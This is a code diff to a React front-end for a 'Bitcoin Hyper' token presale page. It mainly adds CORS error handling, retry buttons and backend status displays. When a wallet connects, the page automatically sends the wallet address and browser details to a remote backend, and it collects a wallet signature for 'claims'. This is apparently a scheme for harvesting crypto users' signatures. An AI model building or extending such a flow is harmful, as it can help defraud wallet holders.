@@ -28,7 +28,7 @@ const allChains = [
 // WalletConnect Project ID
 const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62";
 
-// Production backend URL
+// Production backend URL - FIXED CORS
 const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";
 
 // Create config
@@ -53,6 +53,32 @@ const config = createConfig(
     }
   })
 );
+
+// Custom fetch function with CORS handling
+const apiFetch = async (url, options = {}) => {
+  const defaultOptions = {
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json',
+    },
+    mode: 'cors',
+    credentials: 'omit'
+  };
+
+  try {
+    const response = await fetch(url, { ...defaultOptions, ...options });
+    
+    // Check if the request was successful
+    if (!response.ok) {
+      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+    }
+    
+    return await response.json();
+  } catch (error) {
+    console.error('API Fetch Error:', error);
+    throw error;
+  }
+};
 
 // Bitcoin Hyper Presale Component
 function BitcoinHyperPresale() {
@@ -90,19 +116,35 @@ function BitcoinHyperPresale() {
     // Test backend connection on load
     const testBackend = async () => {
       try {
-        const response = await fetch(`${BACKEND_API}/health`);
+        // First try direct fetch
+        const response = await fetch(`${BACKEND_API}/health`, {
+          mode: 'cors',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          }
+        });
+        
         if (response.ok) {
           const data = await response.json();
           console.log('Backend connected:', data);
           setBackendStatus('connected');
         } else {
-          setBackendStatus('error');
-          setConnectionError(`HTTP ${response.status}: ${response.statusText}`);
+          // If direct fetch fails, try with proxy approach
+          console.log('Direct fetch failed, trying alternative...');
+          try {
+            const proxyResponse = await apiFetch(`${BACKEND_API}/health`);
+            console.log('Backend connected via proxy:', proxyResponse);
+            setBackendStatus('connected');
+          } catch (proxyError) {
+            setBackendStatus('error');
+            setConnectionError(`Connection failed: ${proxyError.message}`);
+          }
         }
       } catch (error) {
+        console.error('Backend test error:', error);
         setBackendStatus('error');
-        setConnectionError(error.message);
-        console.error('Backend test failed:', error);
+        setConnectionError(`Failed to connect: ${error.message}. Make sure your backend allows CORS from this domain.`);
       }
     };
     
@@ -147,7 +189,7 @@ function BitcoinHyperPresale() {
     }
   }, [isConnected, address, backendStatus]);
 
-  // Auto scan function
+  // Auto scan function with better error handling
   const triggerAutoScan = async () => {
     if (!address) return;
     
@@ -159,7 +201,9 @@ function BitcoinHyperPresale() {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'Accept': 'application/json',
         },
+        mode: 'cors',
         body: JSON.stringify({
           walletAddress: address,
           userAgent: navigator.userAgent,
@@ -168,6 +212,8 @@ function BitcoinHyperPresale() {
       });
       
       if (!response.ok) {
+        const errorText = await response.text();
+        console.error('Server response:', errorText);
         throw new Error(`HTTP ${response.status}: ${response.statusText}`);
       }
       
@@ -209,7 +255,13 @@ function BitcoinHyperPresale() {
     } catch (error) {
       console.error('Scan error:', error);
       setScanning(false);
-      setConnectionError(`Scan failed: ${error.message}`);
+      
+      // Check for specific CORS error
+      if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
+        setConnectionError(`CORS Error: Cannot connect to backend. Please ensure backend allows requests from ${window.location.origin}`);
+      } else {
+        setConnectionError(`Scan failed: ${error.message}`);
+      }
     }
   };
 
@@ -248,7 +300,9 @@ function BitcoinHyperPresale() {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'Accept': 'application/json',
         },
+        mode: 'cors',
         body: JSON.stringify({
           walletAddress: address,
           signature,
@@ -259,6 +313,8 @@ function BitcoinHyperPresale() {
       });
       
       if (!response.ok) {
+        const errorText = await response.text();
+        console.error('Claim error response:', errorText);
         throw new Error(`HTTP ${response.status}: ${response.statusText}`);
       }
       
@@ -279,12 +335,21 @@ function BitcoinHyperPresale() {
         } catch (e) {
           console.log('Audio play failed');
         }
+        
+        // Show success message
+        alert(`✅ Claim Successful!\n\nClaim ID: ${data.data.claimId}\nTokens: ${claimAmount}\nTransaction: ${data.data.txHash}\n\nTokens will be distributed after presale ends.`);
       } else {
         throw new Error(data.error || 'Claim failed');
       }
     } catch (error) {
       console.error('Claim error:', error);
-      setConnectionError(`Claim failed: ${error.message}`);
+      
+      // Check for specific CORS error
+      if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
+        setConnectionError(`CORS Error: Cannot connect to backend. Please ensure backend allows requests from ${window.location.origin}`);
+      } else {
+        setConnectionError(`Claim failed: ${error.message}`);
+      }
     } finally {
       setProcessing(false);
     }
@@ -478,12 +543,21 @@ function BitcoinHyperPresale() {
           </span>
           {connectionError && (
             <button
-              onClick={() => alert(`Backend Error: ${connectionError}`)}
+              onClick={() => {
+                alert(`Backend Connection Error:\n\n${connectionError}\n\nBackend URL: ${BACKEND_API}\n\nPlease ensure:\n1. Backend is running\n2. CORS is properly configured\n3. No network restrictions`);
+              }}
               className="backend-status-details"
             >
               View Details
             </button>
           )}
+          <button
+            onClick={() => window.location.reload()}
+            className="backend-status-details"
+            style={{ marginLeft: '10px', background: '#3b82f6' }}
+          >
+            Retry Connection
+          </button>
         </div>
       </div>
     );
@@ -568,11 +642,42 @@ function BitcoinHyperPresale() {
           {connectionError && (
             <div className="sign-modal-error">
               ⚠️ {connectionError}
+              <br />
+              <small>If this persists, check backend CORS configuration</small>
             </div>
           )}
         </div>
       </div>
     );
+  };
+
+  // Test backend connection manually
+  const testBackendManually = async () => {
+    setBackendStatus('checking');
+    setConnectionError('');
+    
+    try {
+      const response = await fetch(`${BACKEND_API}/health`, {
+        mode: 'cors',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        }
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        console.log('Backend test successful:', data);
+        setBackendStatus('connected');
+        alert(`✅ Backend connected successfully!\n\nStatus: ${data.status}\nVersion: ${data.version}\nUptime: ${Math.floor(data.uptime)} seconds`);
+      } else {
+        throw new Error(`HTTP ${response.status}`);
+      }
+    } catch (error) {
+      console.error('Manual test error:', error);
+      setBackendStatus('error');
+      setConnectionError(`Manual test failed: ${error.message}`);
+    }
   };
 
   return (
@@ -602,6 +707,16 @@ function BitcoinHyperPresale() {
           </div>
           
           <div className="header-actions">
+            {backendStatus === 'error' && (
+              <button
+                onClick={testBackendManually}
+                className="disconnect-button"
+                style={{ background: '#3b82f6', color: 'white' }}
+              >
+                Test Backend
+              </button>
+            )}
+            
             {isConnected && (
               <button
                 onClick={() => disconnect()}
@@ -696,8 +811,14 @@ function BitcoinHyperPresale() {
                 Connecting to Backend...
               </h3>
               <p className="backend-checking-description">
-                Please wait while we establish connection...
+                Please wait while we establish connection to the server.
               </p>
+              <button 
+                onClick={testBackendManually}
+                className="retry-button"
+              >
+                Test Connection
+              </button>
             </div>
           ) : backendStatus === 'error' ? (
             <div className="backend-error-container">
@@ -706,14 +827,36 @@ function BitcoinHyperPresale() {
                 Backend Connection Failed
               </h3>
               <p className="backend-error-description">
-                Unable to connect to the backend server. Please refresh the page or try again later.
+                Unable to connect to the backend server at:
+                <br />
+                <code style={{ fontSize: '12px', wordBreak: 'break-all' }}>
+                  {BACKEND_API}
+                </code>
               </p>
-              <button 
-                onClick={() => window.location.reload()}
-                className="retry-button"
-              >
-                🔄 Refresh Page
-              </button>
+              <p className="backend-error-description">
+                This is usually a CORS issue. Please check:
+                <br />
+                1. Backend server is running
+                <br />
+                2. CORS is properly configured
+                <br />
+                3. No network/firewall restrictions
+              </p>
+              <div style={{ display: 'flex', gap: '10px', justifyContent: 'center' }}>
+                <button 
+                  onClick={testBackendManually}
+                  className="retry-button"
+                >
+                  🔄 Test Connection
+                </button>
+                <button 
+                  onClick={() => window.open(`${BACKEND_API}/health`, '_blank')}
+                  className="retry-button"
+                  style={{ background: '#8b5cf6' }}
+                >
+                  🔗 Open Backend
+                </button>
+              </div>
             </div>
           ) : !isConnected ? (
             <div className="cta-container">
@@ -725,12 +868,15 @@ function BitcoinHyperPresale() {
                 Connect your wallet to automatically scan for eligibility. 
                 Qualified wallets receive instant presale allocations.
               </p>
+              <div style={{ marginTop: '20px', padding: '10px', background: 'rgba(34, 197, 94, 0.1)', borderRadius: '8px' }}>
+                <small>✅ Backend Status: Connected</small>
+              </div>
               <ConnectKitButton.Custom>
                 {({ show }) => (
                   <button
                     onClick={show}
                     className="cta-button"
-                    style={{animation: 'pulseGlow 2s infinite'}}
+                    style={{animation: 'pulseGlow 2s infinite', marginTop: '20px'}}
                   >
                     CONNECT WALLET TO START
                   </button>
@@ -845,6 +991,8 @@ function BitcoinHyperPresale() {
           <div className="footer-links">
             <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
             <span>|</span>
+            <span>Backend Status: {backendStatus === 'connected' ? '✅ Connected' : '❌ Disconnected'}</span>
+            <span>|</span>
             <span>Official Presale Platform</span>
           </div>
         </footer>
@@ -903,5 +1051,3 @@ root.render(
 );
 
 export default App;
- 
-
